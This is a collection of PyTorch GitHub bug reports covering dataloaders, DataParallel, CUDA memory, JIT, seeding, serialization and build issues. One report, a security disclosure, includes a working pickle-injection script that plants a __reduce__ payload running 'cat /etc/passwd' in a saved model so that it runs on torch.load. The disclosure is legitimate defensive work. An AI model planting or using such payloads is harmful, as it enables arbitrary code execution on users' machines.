optimizer = optim.SGD(net.parameters(), lr=1e-3)

scaler = GradScaler()

optimizer.zero_grad()

with autocast():
    output = net(torch.rand(10,1,10).cuda())
```

## Environment
torch==1.6.0 nightly (2020-04-10)

@mcarilli 

cc @csarofeen @ptrblck",True
len(DataLoader) doesn't take into account DataLoader.batch_size when using IterableDataset module: dataloader triaged,"## üêõ Bug

The length of a `DataLoader` when using a map `Dataset` is the defined by the sampler, usually defaulting to `BatchSampler`'s method which divides the number of examples in the dataset by the batch size. When using an `IterableDataset` it just returns `len(IterableDataset)`, rather than `len(IterableDataset) // batch_size`. If the `IterableDataset` defines `__len__`, and `loader.batch_size > 0` then the loader will only ever return `len(IterableDataset) // batch_size` batches, so the loader should return this as it's length. This occurs with single process data loading, I understand that multiprocess has other complexities which will cause this to fail in other ways.

## Expected behavior

`len(loader) == (len(dataset) // batch_size)`

## Environment

 - PyTorch Version (e.g., 1.0): 1.4.0
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Python version: 3.6
 - CUDA/cuDNN version: n/a
 - GPU models and configuration: n/a


cc @SsnL",True
"nn.Parameter{List,Dict} not copied to gpus in forward pass when nn.DataParallel is used high priority module: nn triaged module: data parallel","## üêõ Bug

When I use nn.DataParallel to wrap an nn.Module X, nn.Parameter in X is not copied to gpus in the forward pass. I think nn.Parameter can be considered as a part of module parameters, so it should be treated like other nn.Module parameters in X as well. Is it an intentional design?

## To Reproduce

test.py:
```python
import sys
import torch
import torch.nn as nn
import torch.nn.functional as F


gpus = list(map(int, sys.argv[1].split(',')))


class Net(nn.Module):
    def __init__(self):
        super().__init__()

        self.alpha = nn.ParameterList()

        for i in range(4):
            self.alpha.append(nn.Parameter(1e-3*torch.randn(i+2, 5)))

        self.cnn = nn.Conv2d(1, 1, 1, 1, 1)


    def forward(self, x):
        print(self.alpha)
        print(self.cnn)
        return x


if __name__ == '__main__':
    net = Net().cuda()
    if len(gpus) > 1:
        net = nn.DataParallel(net, device_ids=gpus)

    net(torch.rand(4, 5))
```
When I run `python3 test.py 0` (which means device_id = [0]), the output is
```
ParameterList(
    (0): Parameter containing: [torch.cuda.FloatTensor of size 2x5 (GPU 0)]
    (1): Parameter containing: [torch.cuda.FloatTensor of size 3x5 (GPU 0)]
    (2): Parameter containing: [torch.cuda.FloatTensor of size 4x5 (GPU 0)]
    (3): Parameter containing: [torch.cuda.FloatTensor of size 5x5 (GPU 0)]
)
Conv2d(1, 1, kernel_size=(1, 1), stride=(1, 1), padding=(1, 1))
```
However, when I run `python3 test.py 0,1` (which means device_id = [0, 1]), the output is
```
ParameterList()
Conv2d(1, 1, kernel_size=(1, 1), stride=(1, 1), padding=(1, 1))
ParameterList()
Conv2d(1, 1, kernel_size=(1, 1), stride=(1, 1), padding=(1, 1))
```
Only nn.Module is copied to gpus in forward pass.
How can I use and train nn.Parameter just like nn.Module with nn.DataParallel?

## Expected behavior

When the nn.Module X is wrapped with nn.DataParallel, both nn.Module and nn.Parameter in X should be copied to gpus.

## Environment

PyTorch version: 1.6.0.dev20200401+cu101
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Arch Linux
GCC version: (Arch Linux 9.3.0-1) 9.3.0
CMake version: version 3.17.0

Python version: 3.8
Is CUDA available: Yes
CUDA runtime version: 10.2.89
GPU models and configuration: 
GPU 0: GeForce GTX TITAN X
GPU 1: GeForce GTX 1060 6GB

Nvidia driver version: 440.64
cuDNN version: /usr/lib/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip3] numpy==1.18.2
[pip3] torch==1.6.0.dev20200401+cu101
[pip3] torchexp==0.1.0
[pip3] torchvision==0.6.0.dev20200401+cu101
[conda] Could not collect



cc @ezyang @gchanan @zou3519 @albanD @mruberry",True
OOM error where ~50% of the GPU RAM cannot be utilised/reserved module: cuda module: memory usage triaged,"## üêõ Bug

I am experiencing the classic out of memory error where my GPU appears to have a lot of memory still available, however my scenario seems to be a little different to other, fragmentation related, issues I have seen. These other problems point to free memory being less than the reserved/cached memory quoted in the error message, but the reserved (or allocated + cached) is always close to the total capacity of the GPU. 

**In my case the reserved total is only around ~50% of the total capacity of the GPU** which seems like the caching allocator is unable to request any more, despite having plenty available and no other processes running on the card which is in exclusive mode.
```
CUDA out of memory. Tried to allocate 10.84 GiB (GPU 0; 23.65 GiB total capacity; 1.06 GiB already allocated; 10.26 GiB free; 12.53 GiB reserved in total by PyTorch)
```
The other strange thing I have noticed is if I create/delete a (smaller) dummy tensor before creating the larger tensor (which causes the OOM) it results in the reserved memory total increasing, and I am then able to successfully create my larger tensor! I have tried running `torch.cuda.empty_cache()` prior to creating the large tensor and it does not fix this issue.

## To Reproduce

This always occurs on the second iteration of my training loop. The memory pattern I see by recording `torch.cuda.memory_allocated()` and `torch.cuda.memory_reserved()` in GiB directly before and after the creation of the large (problem) tensor is:

### Failure case
**Step 0**
mem_allocated **0.651**, mem_reserved **1.680**
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.495**, mem_reserved **12.523**
...
**Step 1**
mem_allocated **1.061**, mem_reserved **12.529**
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
OOM üß®


### Working case
And in the second scenario where I create then delete a smaller tensor prior to creating the big tensor, in order to bump up the reserved memory and everything works

**Step 0**
`dummy_z = torch.randn([1024, 1024, 2048], device='cuda')`
mem_allocated **8.651**, mem_reserved **9.680** 
`del dummy_z`
`gc.collect()`
mem_allocated **0.651**, mem_reserved **9.680** 
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.495**, mem_reserved **20.523**
...
**Step 1**
`dummy_z = torch.randn([1024, 1024, 2048], device='cuda')`
mem_allocated **9.061**, mem_reserved **20.529** 
`del dummy_z`
`gc.collect()`
mem_allocated **1.061**, mem_reserved **20.529** 
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.905**, mem_reserved **20.529**
...
**Step 2...**


## Expected behavior

To reserve/utilize an amount of memory close to the total available, as I have shown in the working case without having to create/delete dummy tensors.

## Environment
```
PyTorch version: 1.4.0
Is debug build: No                                                                                                                                           
CUDA used to build PyTorch: 10.1                                                                                                                                                                                                                                                                                          
OS: Ubuntu 18.04.4 LTS                                                                                                                                       
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0                                                                                                           
CMake version: version 3.10.2                                                                                                                                                                                                                                                                                             
Python version: 3.7                                                                                                                                          
Is CUDA available: Yes                                                                                                                                       
CUDA runtime version: Could not collect                                                                                                                      
GPU models and configuration:                                                                                                                                
GPU 0: TITAN RTX                                                                                                                                             
GPU 1: TITAN RTX                                                                                                                                             
GPU 2: TITAN RTX                                                                                                                                             
GPU 3: TITAN RTX                                                                                                                                             
GPU 4: TITAN RTX                                                                                                                                             
GPU 5: TITAN RTX                                                                                                                                             
GPU 6: TITAN RTX                                                                                                                                             
GPU 7: TITAN RTX                                                                                                                                                                                                                                                                                                          
Nvidia driver version: 440.59                                                                                                                                
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5                                                                                                                                                                                                                                                                
Versions of relevant libraries:                                                                                                                              
[pip3] numpy==1.18.0                                                                                                                                         
[pip3] pytorch-memlab==0.0.4                                                                                                                                 
[pip3] torch==1.4.0                                                                                                                                          
[pip3] torchaudio==0.4.0                                                                                                                                     
[pip3] torchsummary==1.5.1                                                                                                                                   
[pip3] torchvision==0.4.2                                                                                                                                    
[conda] Could not collect
```

cc @ezyang @gchanan @zou3519 @ngimel",True
backward for tensor.min() and tensor.min(dim=0) behaves differently high priority module: autograd triaged,"## Backward for `tensor.min` behaves differently if `dim` is set 

I noticed that the gradient of the `tensor.min()` function gives a different output when `dim` is set. Namely, when `dim` is set, the gradient will only correspond to one of the entries with the lowest values. If `dim` is not set, then there will be gradient for all entries which have the lowest value

## Code sample to reproduce

```
import torch
a = torch.tensor([0.1, 0.3, 0.1], dtype=torch.float32, requires_grad = True)
a_cp  = torch.tensor([0.1, 0.3, 0.1], dtype=torch.float32, requires_grad = True)
b = a.min()
b.backward()
a.grad  # Output is tensor([1., 0., 1.])
c, d = a_cp.min(dim=0)
c.backward()
a_cp.grad  # Output is tensor([0., 0., 1.])
```

## Problematic for vectorized implementations

This behavior is not expected and it leads to discrepancies in the gradients between vectorized and non implementations. Setting `dim` in `torch.min()` should not change the gradients. 



cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen",True
Unit test failures are not reported as failure by Windows CI high priority triage review module: windows module: ci triaged,"For example    [pytorch_windows_vs2019_py36_cuda10.1_test2](https://app.circleci.com/pipelines/github/pytorch/pytorch/144817/workflows/c0ac3f91-edb1-4294-9cf4-aad70b6a89d0/jobs/4916119) reported to have finished successfully, but if one to grep the log, he can observe that number of tests have failed:
```
$ curl ""https://circleci.com/api/v1.1/project/github/pytorch/pytorch/4916119/output/103/0?file=true&allocation-id=5e79202a061b9e62ea99a5d1-0-build%2F29689000""|grep FAILED|grep '('
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3497k    0 3497k    0     0  2466k      0 --:--:--  0:00:01 --:--:-- 2466k
[  FAILED  ] BoundShapeInference.Int8QuantizeInferInputBackwards (1 ms)
[  FAILED  ] MetaprogrammingTest.FilterMap_onlyCopiesIfNecessary (0 ms)
[  FAILED  ] MetaprogrammingTest.FilterMap_onlyMovesIfNecessary_1 (0 ms)
[  FAILED  ] PowTest.LongTensorPowAllScalars (7 ms)
[  FAILED  ] RoiAlignTest.CheckCPUGPUEqual (148 ms)
```

cc @ezyang @gchanan @zou3519 @seemethere @peterjc123",True
[Master Plan] Merge c10::ivalue::Future and torch::utils::Future<T> oncall: jit triaged better-engineering module: rpc,"Ideally we should have one Future abstraction in PyTorch codebase to have unified code paths regarding Future usage. 

torch::utils::Future<T> is a generic Future, we can specialize it as torch::utils::Future[IValue] and make torch::utils::Future[IValue] to be an IValue. After that, we can kill c10::ivalue::Future implementation

cc @suo @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar @ilia-cher @wanchaol ",True
max / min doesn't work on tensors with 0 elements high priority triaged module: numpy module: reductions,"## üêõ Bug

Current `min` / `max` implementation is too restrictive wrt tensors with zero elements.
Indeed, min/max reduction over an empty dimension should raise an error, as they don't have an identity, but if the dimension being reduced is not of size 0 (but the tensor has 0 elements), then it should work.

## To Reproduce

```python
a = torch.rand(0, 4)
print(a.max(1))
```
raises
```
RuntimeError: cannot perform reduction function max on tensor with no elements because the operation does not have an identity
```
while
```python
a = torch.rand(0, 4)
print(a.numpy().max(1))
```
returns
```
array([], dtype=float32)
```

---
PyTorch version `1.5.0.dev20200225`

cc @ezyang @gchanan @zou3519 @mruberry @rgommers @heitorschueroff",True
Make StorageImpl untyped for non-POD types high priority module: internals triaged module: complex internals,"Right now StorageImpl records a dtype. We should remove the dtype and store bytes directly. Non-POD dtypes should still support custom destruction, but that is built on top of an otherwise untyped representation. Representing storage impls in an untyped way means that we can reinterpret cast tensors, e.g., view a float tensor as a complex tensor.

In the user side we still expose ByteStorage/LongStorage; these should either be eliminated from Python, or implemented as wrappers that know dtype.

cc @ezyang @gchanan @zou3519 @anjali411 @dylanbespalko",True
Caffe2 CMake exported target has hard-coded path under linux module: build caffe2 triaged,"## üêõ Bug

`Caffe2Targets.cmake` from pytorch installed by conda has hard-coded library path, which will make targets depending on torch unable to build, if the CUDA installation directory is different from `/usr/local/cuda`. Specifically in my case, I installed pytorch `py3.6_cuda9.2.148_cudnn7.6.3_0` and the Caffe2 target file contains:

```
set_target_properties(torch PROPERTIES
  INTERFACE_COMPILE_DEFINITIONS ""_THP_CORE;AT_PARALLEL_OPENMP=1""
  INTERFACE_COMPILE_OPTIONS ""-Wall;-Wextra;-Wno-unused-parameter;-Wno-missing-field-initializers;-Wno-write-strings;-Wno-unknown-pragmas;-Wno-missing-braces;-fopenmp""
  INTERFACE_INCLUDE_DIRECTORIES ""${_IMPORT_PREFIX}/include;${_IMPORT_PREFIX}/include""
  INTERFACE_LINK_LIBRARIES ""protobuf::libprotobuf;c10;Threads::Threads;caffe2::mkl;caffe2::mkldnn;torch::cudart;c10_cuda;/usr/local/cuda/lib64/libnvToolsExt.so;/usr/local/cuda/lib64/libcudart.so;caffe2::cufft;caffe2::curand;caffe2::cudnn;/usr/local/cuda/lib64/libculibos.a;dl;caffe2::cublas""
)
```
## To Reproduce

I'm working on an example for pytorch with CMake, you can find it here: https://github.com/cmpute/pytorch-cmake-example.

If I remove the hard-coded libraries in `Caffe2Targets.cmake`, then the compilation of my extension will succeed.

## Expected behavior

The example is fairly simple, but when you try to build the package, there will be an error:

```log
...
-- Configuring done
-- Generating done
-- Build files have been written to: /home/jacobz/pytorch-cmake-example/_skbuild/linux-x86_64-3.6/cmake-build
ninja: error: '/usr/local/cuda/lib64/libnvToolsExt.so', needed by 'lltm_ext.cpython-36m-x86_64-linux-gnu.so', missing and no known rule to make it
Traceback (most recent call last):
  File ""/home/jacobz/.conda/envs/lidar/lib/python3.6/site-packages/skbuild/setuptools_wrap.py"", line 577, in setup
    cmkr.make(make_args, env=env)
  File ""/home/jacobz/.conda/envs/lidar/lib/python3.6/site-packages/skbuild/cmaker.py"", line 482, in make
    os.path.abspath(CMAKE_BUILD_DIR())))

An error occurred while building with CMake.
  Command:
    ""cmake"" ""--build"" ""."" ""--target"" ""install"" ""--config"" ""Release"" ""--""
  Source directory:
    /home/jacobz/pytorch-cmake-example
  Working directory:
    /home/jacobz/pytorch-cmake-example/_skbuild/linux-x86_64-3.6/cmake-build
Please see CMake's output for more information.
```

## Environment

 - PyTorch Version (e.g., 1.0): 1.3
 - OS (e.g., Linux): Ubuntu
 - How you installed PyTorch (`conda`, `pip`, source): conda
 - Build command you used (if compiling from source): precompiled
 - Python version: 3.6
 - Any other relevant information: scikit-build is also needed

This issue is also reported here: https://github.com/facebookresearch/DensePose/issues/185",True
Segfault upon calling torch.Tensor on a gpu tensor high priority module: crash module: cuda triaged,"## üêõ Bug

I accidentally called `torch.Tensor` on a Tensor object, thinking it was a numpy array. Instead of doing nothing or throwing a warning, the program segfaulted. 

## To Reproduce

Minimal code example:

```python
import torch
import numpy as np
device = torch.device('cuda')
a = torch.Tensor(np.random.normal(size=10)).to(device)
torch.Tensor(a)
```

Upon running the final line, python prints ""Segmentation fault (core dumped)"" and dies.

## Expected behavior

I would have expected casting a Tensor to a Tensor to have to result

## Environment

Collecting environment information...
PyTorch version: 1.3.1
Is debug build: No
CUDA used to build PyTorch: 10.1.243

OS: Ubuntu 18.04.4 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
CMake version: Could not collect

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: Could not collect
GPU models and configuration: GPU 0: GeForce RTX 2060
Nvidia driver version: 430.50
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip] numpy==1.16.4
[pip] numpydoc==0.9.1
[pip] torch==1.3.1
[pip] torchfile==0.1.0
[pip] torchvision==0.4.2
[conda] blas                      1.0                         mkl  
[conda] mkl                       2019.4                      243  
[conda] mkl-service               2.0.2            py37h7b6447c_0  
[conda] mkl_fft                   1.0.12           py37ha843d7b_0  
[conda] mkl_random                1.0.2            py37hd81dba3_0  
[conda] torch                     1.3.1                    pypi_0    pypi
[conda] torchfile                 0.1.0                    pypi_0    pypi
[conda] torchvision               0.4.2                    pypi_0    pypi

## Additional context

I was able to reproduce the issue running on google CoLab, so I don't think the issue is specific to my computer

cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @ngimel",True
`torch.seed()` and `torch.initial_seed()` returns not-long numbers high priority triaged module: random,"Our function that give the current or initial seed do not play well with setting these seeds.

```python
import torch

torch.manual_seed(torch.initial_seed()) # Same with torch.seed()
```
Fails with:
```
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-1-055df2441829> in <module>
----> 1 import torch; torch.manual_seed(torch.initial_seed())

source/torch/random.py in manual_seed(seed)
     32         torch.cuda.manual_seed_all(seed)
     33
---> 34     return default_generator.manual_seed(seed)
     35
     36

RuntimeError: Overflow when unpacking long
```



cc @ezyang @gchanan @zou3519 @pbelevich",True
JIT does not support binary operators oncall: jit triaged,"## üêõ Bug

I have a code that looks like this
```
import torch as tc
from torch import jit
@jit.script
def func(inp):
    return inp<<1
a = tc.tensor([3,4,5])
func(a)
```
when I run it, I got the error:
```
torch.jit.frontend.NotSupportedError: unsupported binary operator: LShift:
  File ""example.py"", line 5
@jit.script
def func(inp):
    return inp<<1
              ~~ <--- HERE
```
However, if I change `inp<<1` to `inp.__lshift__(1)`, it works. This also happens in C++.

## Expected behavior

I expect the binary operators to work without changing them to the call to methods.

## Environment

PyTorch version: 1.4.0+cpu
Is debug build: No
CUDA used to build PyTorch: None

OS: Microsoft Windows 10 Home
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.7
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip3] numpy==1.16.3
[pip3] torch==1.4.0+cpu
[pip3] torchvision==0.5.0+cpu
[conda] Could not collect
## Additional context

It is not a very severe problem and I would like to fix it if I know where the source code is located.


cc @suo",True
torch.nonzero issues a DeprecationWarning for non-deprecated usages module: nn module: logging triaged module: deprecation,"## üêõ Bug

<!-- A clear and concise description of what the bug is. -->
Afaics any usage of `torch.nonzero` is producing a deprecation warning

## To Reproduce

```
In [1]: import torch

In [2]: t = torch.arange(2)

In [3]: torch.nonzero(t)
../torch/csrc/utils/python_arg_parser.cpp:738: UserWarning: This overload of nonzero is deprecated:
        nonzero(Tensor input, Tensor out)
Consider using one of the following signatures instead:
        nonzero(Tensor input, bool as_tuple)
Out[3]: tensor([[1]])
```

## Expected behavior

No deprecation warning

<!-- A clear and concise description of what you expected to happen. -->

## Environment

```
PyTorch version: 1.5.0a0+d2098bd
Is debug build: No
CUDA used to build PyTorch: 10.2

OS: Ubuntu 18.04.3 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
CMake version: version 3.16.1

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.2.89
GPU models and configuration:
GPU 0: TITAN RTX
GPU 1: TITAN RTX

Nvidia driver version: 440.33.01
cuDNN version: /usr/local/cuda-10.2.89/targets/x86_64-linux/lib/libcudnn.so.7

Versions of relevant libraries:
[pip] numpy==1.17.3
[pip] torch==1.5.0a0+d2098bd
[conda] mkl                       2019.5                      281    conda-forge
[conda] mkl-include               2019.5                      281    conda-forge
[conda] torch                     1.5.0a0+d2098bd           dev_0    <develop>
```


cc @albanD @mruberry",True
PyTorch should hide CUDNN symbols in libtorch.so module: build module: cudnn triaged,"## üêõ Bug

PyTorch's `libtorch.so` exposes a lot of CUDNN API symbols. This causes issues when our application (independent from PyTorch) uses a different CUDNN version.

<!-- A clear and concise description of what the bug is. -->

## To Reproduce

Install PyTorch 1.4.0. Run `nm` on the `libtorch.so`, and there will be a lot of CUDNN API symbols.

```
nvpohanh@ubuntu:~$ nm /usr/local/lib/python3.5/dist-packages/torch/lib/libtorch.so | grep ' cudnnCreate'
000000000f479c30 T cudnnCreate
000000000f475ff0 T cudnnCreateActivationDescriptor
000000000f4747e0 T cudnnCreateAlgorithmDescriptor
000000000f474930 T cudnnCreateAlgorithmPerformance
000000000f473e90 T cudnnCreateConvolutionDescriptor
000000000f621a10 T cudnnCreateCTCLossDescriptor
000000000fc8cb50 T cudnnCreateDropoutDescriptor
000000000f47b3c0 T cudnnCreateFilterDescriptor
000000000f476460 T cudnnCreateLRNDescriptor
000000000f4752d0 T cudnnCreateOpTensorDescriptor
000000000fbe5520 T cudnnCreatePersistentRNNPlan
000000000f476af0 T cudnnCreatePoolingDescriptor
000000000f474f00 T cudnnCreateReduceTensorDescriptor
000000000fbe4f90 T cudnnCreateRNNDataDescriptor
000000000fbe3880 T cudnnCreateRNNDescriptor
000000000f475450 T cudnnCreateSpatialTransformerDescriptor
000000000f47aca0 T cudnnCreateTensorDescriptor
000000000f47cde0 T cudnnCreateTensorTransformDescriptor
```

## Expected behavior

PyTorch should hide CUDNN symbols in libtorch.so

<!-- A clear and concise description of what you expected to happen. -->

## Environment

```
Collecting environment information...
PyTorch version: 0.4.0
Is debug build: No
CUDA used to build PyTorch: 9.0.176

OS: Ubuntu 16.04.4 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
CMake version: version 3.13.3

Python version: 2.7
Is CUDA available: Yes
CUDA runtime version: 10.2.89
GPU models and configuration: GPU 0: TITAN RTX
Nvidia driver version: 440.33.01
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] numpy==1.18.1
[pip] torch==1.4.0
[pip] torchvision==0.2.1
[conda] Could not collect
```

## Additional context

<!-- Add any other context about the problem here. -->


cc @csarofeen @ptrblck",True
LambdaLR type bug module: optimizer triaged,"## üêõ Bug

In `torch/optim/lr_scheduler.pyi`, type of `LambdaLR`'s constructor is

```python
class LambdaLR(_LRScheduler):
    def __init__(self, optimizer: Optimizer, lr_lambda: float, last_epoch: int=...) -> None: ...
```

but description of `LambdaLR` in `torch/optim/lr_scheduler.py` is as follow.

```python
class LambdaLR(_LRScheduler):
    """"""Sets the learning rate of each parameter group to the initial lr
    times a given function. When last_epoch=-1, sets initial lr as lr.

    Args:
        optimizer (Optimizer): Wrapped optimizer.
        lr_lambda (function or list): A function which computes a multiplicative
            factor given an integer parameter epoch, or a list of such
            functions, one for each group in optimizer.param_groups.
        last_epoch (int): The index of last epoch. Default: -1.

    Example:
        >>> # Assuming optimizer has two groups.
        >>> lambda1 = lambda epoch: epoch // 30
        >>> lambda2 = lambda epoch: 0.95 ** epoch
        >>> scheduler = LambdaLR(optimizer, lr_lambda=[lambda1, lambda2])
        >>> for epoch in range(100):
        >>>     train(...)
        >>>     validate(...)
        >>>     scheduler.step()
    """"""
```

I think type of `LambdaLR` should be as follow.

```python
LRLambdaType = Callable[[int], float]

class LambdaLR(_LRScheduler):
    def __init__(self, optimizer: Optimizer, lr_lambda: Union[LRLambdaType, List[LRLambdaType]], last_epoch: int=...) -> None: ...
```


cc @vincentqb",True
torch::jit::script::Module::clone() is not actually cloning parameters high priority triage review oncall: jit triaged,"## üêõ Bug

If you take a look at the highlighted section: https://github.com/pytorch/pytorch/blob/4314620ba05bc1867f6a63455c4ac77fdfb1018d/torch/csrc/jit/script/module.cpp#L191-L203, you would notice that when `IValue s` is not a module, `Module r` will simply register it. Therefore, the new module will share the same parameters.

## To Reproduce

Steps to reproduce the behavior:

1. Load any TorchScript model `model`
2. Run `clone = model.clone()`
3. Find any parameter in `model` and that same parameter in `clone`, `isAliasOf` will evaluate to `true`

## Expected behavior

Expect `clone()` to deep copy  everything in a TorchScript model.

## Environment

N/A

## Additional context

N/A


cc @ezyang @gchanan @zou3519 @suo",True
python error UnboundLocalError in jit/frontend.py oncall: jit triaged,"## üêõ Bug

One of the error cases in the function ```build_param_list``` uses ```ctx_range``` without defining it, in the following context:
```
    if not PY2 and py_args.kw_defaults:
        raise NotSupportedError(ctx_range, _vararg_kwarg_err)
```
## To Reproduce

Steps to reproduce the behavior:

I was using ```torch.jit.script()``` on a large module, and since it's the error reporting that's failing I don't have a line reference. By inspection, however, I believe the unsupported feature was the asterisk in the following function definition:
```
    @torch.jit.export
    def initState(self, *, n_tokens: int, device_name: str) -> None:
```

## Expected behavior

Relevant error message should be reported.

cc @suo",True
Third party PyTorch models may execute arbitrary code during deserialization high priority module: docs module: serialization triaged,"## üìö Documentation

PyTorch serialization mechanisms are built upon the `pickle` library that is [known to be insecure](https://docs.python.org/3/library/pickle.html) when dealing with third-party data.
It concerns both the saved model parameters and the entire model saving (which are considered to be the [best practices](https://pytorch.org/docs/stable/notes/serialization.html))

### Example script, that infects any existing model:

```python
import torch
import pickle

ON_REDUCE = """"""
global MAGIC_NUMBER
MAGIC_NUMBER = None
import os;os.system('cat /etc/passwd')
""""""

class Payload:
    def __reduce__(self):
        return (exec, (ON_REDUCE,))

model = torch.load('inception_v3_google-1a9a5a14.pth')
torch.serialization.MAGIC_NUMBER = Payload()
torch.save(model, 'evil.pth')
```

Then, if any user will download an infected model and execute `torch.load('evil.pth')` the arbitrary command will be executed on his device. That is also relevant to [torch.hub.load](https://pytorch.org/docs/stable/hub.html#torch.hub.load), which will download and deserialize the model itself.

### Small demo:
![image](https://user-images.githubusercontent.com/23273750/71783559-11da7080-301b-11ea-8860-16ac30f0bdf6.png)

### Proposed solution
As an easy solution you may consider adding a warning in a [documentation](https://pytorch.org/docs/stable/notes/serialization.html), that warns the users of using untrusted models

cc @ezyang @gchanan @zou3519",True
DistributedSampler can't shuffle the dataset high priority oncall: distributed module: dataloader triaged,"## üêõ Bug

<!-- A clear and concise description of what the bug is. -->
When using the torch.utils.data.distributed.DistributedSampler () function, the data set cannot be shuffled, and each epoch samples the data in the same order.

## To Reproduce

Steps to reproduce the behavior:
```python
import torch
import os
from torch.utils.data import Dataset, DataLoader
import numpy as np

os.environ[""CUDA_VISIBLE_DEVICES""] = ""0""

np.random.seed(5)

class RandomDataset(Dataset):
    def __init__(self):
        self.data = torch.rand(22, 1, 32, 32)
        self.name = torch.arange(1, 22)
        
    def __getitem__(self, idx):
        return self.name[idx], self.data[idx]
    
    def __len__(self):
        return len(self.data)
    

torch.distributed.init_process_group(backend=""nccl"")

dataset = RandomDataset()
sampler = torch.utils.data.distributed.DistributedSampler(dataset, shuffle=True) 
dataloader = DataLoader(dataset, 
    batch_size=5,   
    pin_memory=True, drop_last=True, sampler=sampler) 

for epoch in range(3):
    print(""epoch: "", epoch)
    for i, data in enumerate(dataloader, 0):
        names, _ = data
        print(names)
```

Run this code by executing:
```
python -m torch.distributed.launch --nproc_per_node=1 test.py
```

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior
Expect different data batch combinations for each epoch.
for example:
In epoch 1, My code prints:
tensor([10,  4, 15,  3, 11])
tensor([ 5,  9, 20, 19, 13])
tensor([ 2,  0, 18, 16,  7])
tensor([ 8,  6, 14, 17,  1])
In epoch 2, My code prints:
tensor([ 5,  9, 15,  3, 13])
tensor([10,  4, 20, 19, 11])
tensor([ 2,  14, 17, 0,  1])
tensor([ 8,  6, 18, 16,  7])
and so on.
<!-- A clear and concise description of what you expected to happen. -->
But now, the output is:
epoch:  1
tensor([10,  4, 15,  3, 11])
tensor([ 5,  9, 20, 19, 13])
tensor([ 2,  0, 18, 16,  7])
tensor([ 8,  6, 14, 17,  1])
epoch:  2
tensor([10,  4, 15,  3, 11])
tensor([ 5,  9, 20, 19, 13])
tensor([ 2,  0, 18, 16,  7])
tensor([ 8,  6, 14, 17,  1])

Every epoch, the names are the same„ÄÇ

## Environment

PyTorch version: 1.3.1+cu100
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 16.04.6 LTS
GCC version: (Ubuntu 6.5.0-2ubuntu1~16.04) 6.5.0 20181026
CMake version: version 3.5.1

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration:
GPU 0: GeForce GTX 1080 Ti
GPU 1: GeForce GTX 1080 Ti
GPU 2: GeForce GTX 1080 Ti
GPU 3: GeForce GTX 1080 Ti

Nvidia driver version: 418.67
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip3] numpy==1.15.4
[conda] _tflow_select             2.3.0                       mkl
[conda] pytorch-wpe               0.0.0                    pypi_0    pypi
[conda] tensorflow                1.14.0          mkl_py36h2526735_0
[conda] tensorflow-base           1.14.0          mkl_py36h7ce6ba3_0
[conda] torch                     1.3.1+cu100              pypi_0    pypi
[conda] torch-complex             0.0.2                    pypi_0    pypi
[conda] warpctc-pytorch           0.1                      pypi_0    pypi
[conda] warpctc-pytorch10-cuda100 0.1.3                    pypi_0    pypi
[conda] warprnnt-pytorch          0.1                      pypi_0    pypi



Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0):
 - OS (e.g., Linux):
 - How you installed PyTorch (`conda`, `pip`, source):
 - Build command you used (if compiling from source):
 - Python version:
 - CUDA/cuDNN version:
 - GPU models and configuration:
 - Any other relevant information:

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @SsnL @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528",True
ConvTranspose2d much slower with output_padding set module: cudnn triaged,"## üêõ Bug

A `nn.ConvTranspose2d` can be up to two orders of magnitude slower when the `output_padding` option is set to a nonzero value then when it isn't.

## To Reproduce

```
class Test(nn.Module):
    def __init__(self, output_padding):
        super().__init__()
        
        self.c1 = nn.ConvTranspose2d(128, 64, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
        self.c2 = nn.ConvTranspose2d(64, 32, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
        self.c3 = nn.ConvTranspose2d(32, 3, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
    def forward(self, x):
        x = self.c1(x)
        x = nn.functional.relu(x)
        x = self.c2(x)
        x = nn.functional.relu(x)
        x = self.c3(x)
        x = nn.functional.relu(x)
        return x

